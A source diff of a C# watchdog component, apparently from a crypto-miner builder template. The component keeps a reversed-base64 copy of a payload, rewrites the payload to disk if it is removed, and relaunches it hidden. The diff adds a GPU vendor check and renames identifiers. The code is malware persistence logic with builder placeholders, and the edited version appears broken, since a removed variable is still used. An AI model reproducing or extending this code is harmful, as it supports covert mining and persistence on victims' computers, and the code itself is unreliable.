@@ -3,6 +3,7 @@ using System.Diagnostics;
 using System.IO;
 using System.Management;
 using System.Reflection;
+using System.Security.Principal;
 using System.Security.Cryptography;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -20,9 +21,9 @@ using System.Windows.Forms;
 
 [assembly: Guid("%Guid%")]
 
-public partial class Program
+public partial class RProgram
 {
-    public static string reT = "";
+    public static string rxM = "";
     public static string rplp = "";
     public static int checkcount = 0;
 
@@ -31,7 +32,7 @@ public partial class Program
         try
         {
             rplp = PayloadPath;
-            reT = Convert.ToBase64String(File.ReadAllBytes(rplp).Reverse().ToArray());
+            rxM = Convert.ToBase64String(File.ReadAllBytes(rplp).Reverse().ToArray());
             RWDLoop();
         }
         catch (Exception ex)
@@ -47,57 +48,25 @@ public partial class Program
     {
         try
         {
+            if (!File.Exists(rplp))
+            {
+                checkcount = 0;
+                File.WriteAllBytes(rplp, Convert.FromBase64String(rxM).Reverse().ToArray());
+                RStart();
+            }
             if (!RCheckProc())
             {
-                if (!File.Exists(rplp))
-                {
-                    File.WriteAllBytes(rplp, Convert.FromBase64String(reT).Reverse().ToArray());
-                    Process.Start(new ProcessStartInfo
-                    {
-                        FileName = rplp,
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        CreateNoWindow = true,
-                    });
-                }
-                else if (checkcount < 2)
+                if (checkcount < 2)
                 {
                     checkcount += 1;
                 }
                 else
                 {
                     checkcount = 0;
-                    Process.Start(new ProcessStartInfo
-                    {
-                        FileName = rplp,
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        CreateNoWindow = true,
-                    });
+                    RStart();
                 }
             }
-            else
-            {
-                checkcount = 0;
-                if (!File.Exists(rplp))
-                {
-                    File.WriteAllBytes(rplp, Convert.FromBase64String(reT).Reverse().ToArray());
-                    Process.Start(new ProcessStartInfo
-                    {
-                        FileName = rplp,
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        CreateNoWindow = true,
-                    });
-                }
-            }
-
-            int startDelay = 0;
-            if (int.TryParse("#STARTDELAY", out startDelay) && startDelay > 0)
-            {
-                Thread.Sleep(startDelay * 1000 + 5000);
-            }
-            else
-            {
-                Thread.Sleep(10000);
-            }
+            Thread.Sleep(startDelay * 1000 + 5000);
 
             RWDLoop();
         }
@@ -110,20 +79,51 @@ public partial class Program
 
     }
 
+    public static void RStart()
+    {
+        Process.Start(new ProcessStartInfo
+        {
+            FileName = rplp,
+            WindowStyle = ProcessWindowStyle.Hidden,
+            WorkingDirectory = Path.GetDirectoryName(rplp),
+            CreateNoWindow = true,
+        });
+    }
+
     public static bool RCheckProc()
     {
         try
         {
+            string gpu = "";
+
             var options = new ConnectionOptions();
             options.Impersonation = ImpersonationLevel.Impersonate;
-            var scope = new ManagementScope(@"\\" + Environment.UserDomainName + @"\root\cimv2", options);
+            var scope = new ManagementScope(@"\root\cimv2", options);
             scope.Connect();
 
-            string wmiQuery = string.Format("Select CommandLine from Win32_Process where Name='{0}'", "#InjectionTarget");
-            var query = new ObjectQuery(wmiQuery);
+            var query = new ObjectQuery("SELECT Name, VideoProcessor FROM Win32_VideoController");
             var managementObjectSearcher = new ManagementObjectSearcher(scope, query);
             var managementObjectCollection = managementObjectSearcher.Get();
-            foreach (ManagementObject retObject in managementObjectCollection)
+            foreach (ManagementObject MemObj in managementObjectCollection)
+            {
+                gpu += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]).ToLower();
+            }
+
+            if(!gpu.Contains("nvidia") && !gpu.Contains("amd"))
+            {
+                return true;
+            }
+
+            var options2 = new ConnectionOptions();
+            options2.Impersonation = ImpersonationLevel.Impersonate;
+            var scope2 = new ManagementScope(@"\root\cimv2", options2);
+            scope2.Connect();
+
+            string wmiQuery2 = string.Format("Select CommandLine from Win32_Process where Name='{0}'", "#InjectionTarget");
+            var query2 = new ObjectQuery(wmiQuery2);
+            var managementObjectSearcher2 = new ManagementObjectSearcher(scope2, query2);
+            var managementObjectCollection2 = managementObjectSearcher2.Get();
+            foreach (ManagementObject retObject in managementObjectCollection2)
             {
                 if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains("--cinit-find-e"))
                 {
